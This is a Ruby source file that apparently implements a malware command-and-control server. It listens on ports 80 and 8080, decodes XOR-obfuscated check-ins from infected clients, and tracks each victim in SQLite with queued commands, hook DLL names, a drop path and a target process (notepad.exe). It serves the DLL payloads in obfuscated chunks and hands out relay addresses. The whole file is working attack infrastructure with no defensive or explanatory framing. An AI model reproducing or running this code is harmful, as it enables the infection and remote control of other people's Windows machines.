require 'socket'
require 'active_record'

def decode_anton(string)
	return(string.split('').map{|l| [(l.ord%256).chr, (l.ord/256).chr] }.join)
end

def local_ip
	UDPSocket.open {|s| s.connect('64.233.187.99', 1); s.addr.last }
end

server = local_ip
ports = [80, 8080]
servers = ports.map { |p| TCPServer.new(server, p) }

ActiveRecord::Base.establish_connection({adapter: "sqlite3", database: "users.db"})

ActiveRecord::Schema.define do
	if !ActiveRecord::Schema.tables.include?("users")
		create_table :users do |table|
			table.column :name, :string
			table.column :command, :string
			table.column :mark, :string
			table.column :library, :string
			table.column :x, :string
			table.column :path, :string
			table.column :process, :string
		end
	end
end

class User < ActiveRecord::Base
end

methods = Array.new(ports.length)

@pool = []

(0..10).each do |n|
	@pool.push("111.111.111.#{n.to_s*2}")
end

methods[0] = lambda do |client|
	line = client.recv(1024)
	buf = line.encode("UTF-8", "Windows-1251")
	buf = buf.unpack("U*").map { |e| [(e^6)].pack("U*") }.join
	puts buf
	buf = buf.split("|")

	answer = ""

	if buf[0] == "get"
		if User.find_by_name(buf[1]) == nil
			User.create!({
				name: buf[1], 
				command: "A0", 
				mark: "256", 
				library: "hookx64.dll", 
				x: "1", 
				path: "C:\\library1.dll",
				process: "notepad.exe"})
		end
		@user = User.find_by_name(buf[1])
		answer = @user.command
		@user.command = "A0"
		@user.save
	end

	if buf[0] == "getTPC"

		@u = User.find_by_name(buf[1])
		@file_name = @u.library

		if buf[2].to_i > 10
			if buf[2].to_i == 86
				@file_name = "msvcp140CBx86.dll"
			elsif buf[2].to_i == 64
				@file_name = "msvcp140CBx64.dll"
			end
		end
		
		@file = File.open(@file_name, 'rb')
		@file_buffer = @file.read
		count = @file_buffer.length/1024
		residue = @file_buffer.length%1024
		answer = "#{@u.mark}##{@u.x}##{count}##{residue}#"
	elsif buf[0] == "getP"
		path = decode_anton @u.path
		answer = "#{path.length/2}##{path}"
	elsif buf[0] == "getN"
		name = decode_anton @u.process
		answer = "#{name.length/2}##{name}"
	elsif buf[0] == "getPart"
		part = buf[3].to_i
		file_buffer = File.open(@file_name, 'rb').read
		count = file_buffer.length/1024
		current = count - part
		res = file_buffer[current*1024..(current+1)*1024] if part != 0
		res = file_buffer[count*1024..count*1024+file_buffer.length%1024] if part == 0
		answer = res
	end

	if buf[0] == "getPool"
		answer = "#{@pool[buf[2].to_i]}\0"
	end

	if buf[0] == "getTimeout"
		answer = "0"
	end

	if buf[0] == "getReady"
		answer = "yes"
	elsif buf[0] == "setP"
	end

	if buf[0] == "getReadyAI"
		answer = "yes"
	end

	if buf[0] == "getReadyI"
		answer = "yes"
	end

	answer += "\0"*(1024 - answer.size) if buf[0] != "getPart"
	answer = answer.unpack("U*").map { |e| [(e^6)].pack("U*") }.join if buf[0] != "getPart"
	answer = answer.unpack("C*").map { |e| [(e^6)].pack("C*") }.join if buf[0] == "getPart"
	client.write answer
	client.close
end

methods[1] = lambda do |client|
	puts client.recv(1024)
	client.close
end

threads = servers.each_with_index.map do |srv, index|
	Thread.new do
		puts "Server #{srv.local_address.ip_address}:#{srv.local_address.ip_port} started"
		while client = srv.accept
			Thread.new { methods[index].call(client); Thread.current.join }
			# methods[index].call(client)
		end
	end
end

threads.each { |t| t.join }